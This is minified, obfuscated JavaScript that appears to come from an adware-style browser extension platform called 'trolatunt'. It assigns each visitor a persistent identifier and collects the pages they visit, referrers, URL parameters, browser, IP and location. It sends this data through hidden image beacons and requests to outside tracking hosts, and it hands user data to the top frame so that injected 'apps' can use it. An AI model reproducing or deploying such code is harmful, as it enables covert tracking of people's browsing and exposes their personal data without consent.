(function(){function F(a,b){if(a.constructor){var c=a.constructor.prototype[b],d=typeof c;if("function"==d||r&&9>r&&"object"==d)return function(){return c.apply(a,arguments)}}if(r&&8>r&&a===s)try{return eval(["(function () {delete ","; return ",";})()"].join(b))}catch(e){}return a[b]}function G(a){if(!H){H={};for(var b=s.location.search.substr(1).split("&"),c=0;c<b.length;c++){var d=b[c].split("=");H[decodeURIComponent(d[0])]=2==d.length?decodeURIComponent(d[1]):""}}return H[a]}function U(a){if("function"==
typeof V)return V(a);for(var b,c=0,d=va,e="";a.charAt(c|0)||(d="=",c%1);e+=d.charAt(63&b>>8-c%1*8))b=b<<8|a.charCodeAt(c-=-.75);return e}function x(a){for(var b="",c=0;c<a;c++)b+=wa.charAt(Math.floor(16*Math.random()));return b}function W(){return[x(8),x(4),x(4),x(4),x(12)].join("-")}function X(){var a=new Date,b=a.getUTCMonth()+1;return""+a.getUTCFullYear()+(9<b?"":"0")+b+a.getUTCDate()}function M(a){for(var b=[],c=0;c<a.length;c++)b.push(encodeURIComponent(a[c].toString().replace(/,/g,"$cma;")));
(new Image).src="https:"+xa+b.shift()+"="+b.join("|,|")}function ya(){for(var a=0;a<Y.length;a++){var b=Y[a].exec(navigator.userAgent);if(b)return a=b.splice(1,2),2>a.length&&a.push("0"),a}return["Unknown","0"]}function za(a,b){a.addEventListener?a.addEventListener("message",b,!1):a.attachEvent&&a.attachEvent("onmessage",b)}function z(a,b,c,d){var e=(new Date).valueOf(),f;if(!(d&&m>=Aa&&e-A<Ba))return d&&w(Z,A=e),!r||9<r?(f=new XMLHttpRequest,f.onload=function(){d&&w(N,200==f.status?m=0:++m);"function"==
typeof b&&b.call(f)},f.open("GET",a),f.timeout=$,f.send()):(f=new XDomainRequest,f.onload=function(){d&&w(N,m=0);"function"==typeof b&&b.call(f)},f.ontimeout=f.onerror=function(){d&&w(N,++m);"function"==typeof c&&c.call(f)},f.onprogress=function(){return Ca},f.timeout=$,f.open("GET",a),O(function(){f.send()},0)),f}function n(a){try{return p.parse(localStorage.getItem(a))}catch(b){}}function w(a,b){try{localStorage.setItem(a,p.stringify(b))}catch(c){}}function aa(a){var b=(new Date).valueOf(),c="function"==
typeof a,d=ba+"/gd2?r="+X();!k||b-k[t]>=k[I]?z(d,function(){k=p.parse(this.responseText);k[t]=b;w(ca,k);c&&a()},function(){c&&a()}):c&&a()}function da(a){var b=(new Date).valueOf(),c="function"==typeof a,d=ba+"/ga2?r="+X();!u||b-u[t]>=u[I]?z(d,function(){u=p.parse(this.responseText);u[t]=b;w(ea,u);c&&a()},function(){c&&a()}):c&&a()}function Q(a,b,c){var d=(new Date).valueOf(),e="function"==typeof c;b=Da+(a?"/uu?a="+encodeURIComponent(a)+"&e="+encodeURIComponent(b)+"&r=":"/gu?r=")+1E20*Math.random()+
"&g="+encodeURIComponent(g);a||!h||d-h[t]>=h[I]?z(b,function(){h=p.parse(this.responseText);h[t]=d;w(fa,h);e&&c()},function(){e&&c()},!0):e&&c()}function R(a,b){var c=U(a),d=a.length,e=new Date;e.valueOf()-(l[t]||0)>=Ea&&(l={});var f=l[c];if(f)"function"==typeof b&&b(f);else if("function"==typeof b&&S.push(b),"undefined"==typeof ga){for(var g=e.getUTCFullYear(),h=e.getUTCMonth(),k=e.getUTCDate(),g=[31,(g%4||!(g%100))&&g%400?28:29,31,30,31,30,31,31,30,31,30],q=0;q<h;q++)d+=g[q];ga=z("//api.crtinv.com/uchelper?l="+
c+"&k="+U((d+k).toString()),function(){try{var b=this.responseText,a=p.parse(b.substring(1,b.length-1));f={categories:[],isBadCategory:a[Fa],isBadUrl:a[Ga]};l[t]||(l[t]=e.valueOf());for(q in a[Ha])f.categories.push(parseInt(q,10));l[c]=f;for(w(ha,l);S.length;)S.pop()(f)}catch(d){}})}}function ia(a,b,c,d){for(var e=0;e<c.length;e++)if(ja(a,c[e]))return!0;for(e=0;e<b.length;e++)if(ja(a,b[e]))return"undefined"!=typeof d&&d instanceof Array&&d.push(b[e][Ia]||0),!1;return!c.length||!!b.length}function ja(a,
b){for(var c=a.toLowerCase().split("."),d=b.domain.toLowerCase().split("."),e=!1;d.length;)for(var f=d.pop();c.length;){var g=c.pop();if(f==g){e||(e=!0);break}if(b.isTLD||e)return!1}return e}function Ja(a){var b=v.createElement("script");b.type="text/javascript";b.src="//cdnjs.cloudflare.com/ajax/libs/json3/3.2.4/json3.min.js";b.onload=b.onreadystatechange=function(){if(!this.readyState||"loaded"==this.readyState||"complete"==this.readyState){b.onload=b.onreadystatechange=null;b.parentNode.removeChild(b);
try{"function"==typeof a&&a()}catch(c){}}};(v.body||v.head).appendChild(b)}function ka(){function a(b){try{if(b.source==s.top){var a=b.data;"string"==typeof a&&(a=p.parse(a));"object"==typeof a&&a.ext==y&&("getcategory"==a.msg?R(q,function(a){a={ext:y,msg:"category",categoryData:a};s.top.postMessage(!r||9<r?a:p.stringify(a),b.origin||"*")}):"statechange"==a.msg&&"number"==typeof a.appid&&"boolean"==typeof a.state&&Q(a.appid,a.state))}}catch(c){}}function b(){if(q&&k&&u){var b=u[la]||0,n=k&&k[la]||
0,l=[],m=-1,B=new Date,K=parseInt,C;a:{try{C=p.parse(sessionStorage.getItem(ma));break a}catch(N){}C=void 0}K=K(C,10);if(!K){K=B.valueOf();try{sessionStorage.setItem(ma,p.stringify(K))}catch(O){}}v.images&&(P||(M(["InitialPageVisit_2",L+"_"+y,g,q,n,b]),P=!0,w(na,P)),!J||B.getUTCFullYear()>J.getUTCFullYear()||B.getUTCMonth()>J.getUTCMonth()||B.getUTCDate()>J.getUTCDate())&&(M(["DailyActiveExtensionUser_4",L,y,t,D||"",g,n,b].concat(I)),J=B,w(z,J.valueOf()));h&&(d=h.user||{},oa||(oa=!0,d.apps[pa]&&d.apps[pa].enabled&&
R(q,function(a){for(a=a.categories.slice(0,5);5>a.length;)a.push("");M(["PanelPageVisit_4",y,g,f,B.valueOf(),G("n").substr(0,1E3),G("t").substr(0,1E3),x.substr(0,4E3),G("r").substr(0,4E3),n,b].concat(a,I,L,h[qa].countryCode))})));if(ia(q,k.blacklistedDomains||[],[],l))ra||(ra=!0,M(["PageVisitCounter_1",L+"_"+y,g])),.1>Math.random()&&R(q,function(a){for(a=a.categories.slice(0,5);5>a.length;)a.push("");M(["PageVisit_2",L+"_"+y,g,H,n,b].concat(a))});else for(;l.length;)m&=l.pop();l=u.appsWithSettings||
[];for(C=0;C<l.length;C++){var E=l[C],F=E[Ka]||-1,A=d.apps[E.id];A&&A.enabled&&(F&m)==F&&(E.sessionDelay||0)<=B.valueOf()-K&&ia(q,E.blacklistDomains,E.whitelistDomains)&&(E.customSettings.bitFlags=A.bitFlags,e.push(E))}za(s,a);m={ext:y,msg:"userdata",installSource:D,ip:h[La],geo:h[qa],bucketId:d[Ma],token:f,appData:e};s.top.postMessage(!r||9<r?m:p.stringify(m),c.protocol+"//"+c.hostname+(80!=c.port&&443!=c.port?":"+c.port:""))}}g=localStorage.getItem(sa);D=localStorage.getItem(ta);P=n(na);k=n(ca);
u=n(ea);h=n(fa);l=n(ha)||{};A=n(Z)||0;m=n(N)||0;var c=v.createElement("a");c.href=v.referrer;F(s,"setInterval");var d={},e=[],f=W(),t="https:"==c.protocol,x=v.referrer,H=x.substr(0,2E3),q=c.hostname,z=t?Na:Oa,J=new Date(n(z)||0),I=ya();g&&ua.test(g)||(g=G("g"),g&&ua.test(g)||(g=W(),D="thin"),localStorage.setItem(sa,g));D||(D=G("is"),localStorage.setItem(ta,D));L=G("bp")||"BF";k&&u&&h?b():(k||aa(b),u||da(b),h||Q(null,null,b));O(function(){aa()},T);O(function(){da()},T);O(function(){Q()},T)}var s=window,
v=document,p,r=!1,H,va="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",y="trolatunt",Da="//api.trolatunt.co",ba="//apitrolatuntco-a.akamaihd.net",Ea=6048E5,$=5E3,Aa=3,T=3E4,Ba=9E5,sa="ug",ta="is",na="irl",Oa="aul",Na="asul",ma="st",ca="platform_blacklist",Ia="aat",ea="app_data",Ka="t",fa="user_state",La="ip",Ma="bucketId",qa="geo",I="cacheTimeMS",la="serverTimestamp",t="timestamp",ha="categories",Ha="uc",Fa="hc",Ga="bu",Z="xhr_timestamp",N="xhr_fail_count",
pa=1015,xa="//jsl.infostatsvc.com/?",L,g,D,P=!1,k,u,h,l,S=[],ga,oa=!1,ra=!1,A,m,O=F(s,"setTimeout"),V=F(s,"btoa"),Ca="foo",wa="0123456789abcdef",ua=/^[\d,a-f]{8}-(?:[\d,a-f]{4}-){3}[\d,a-f]{12}$/i,Y=[/\b(opr)\/([\d\.]+)\b/i,/\b(lunascape)[\/ ]([\d\.]+)\b/i,/\b(maxthon)\/([\d\.]+)\b/i,/\b(yabrowser)\/([\d\.]+)\b/i,/\b(mrchrome)\b/i,/\b(chrome)\/([\d\.]+)\b/i,/\b(msie)\s([\d\.]+)\b/i,/\b(trident)\/([\d\.]+)\b/i,/\b(firefox)\/([\d\.]+)\b/i,/\b(safari)\/([\d\.]+)\b/i,/\b(opera)\/([\d\.]+)\b/i];(function(){var a=
v.documentMode,b;try{delete v.documentMode,b=v.documentMode,v.documentMode=a}catch(c){}"number"==typeof b?r=b:"number"==typeof a&&(r=a);var d=s.JSON;"object"==typeof d&&"function"==typeof d.stringify&&"function"==typeof d.parse?(p=d,ka()):Ja(function(){p=s.JSON;"undefined"!=typeof d&&(s.JSON=d);ka()})})()})();
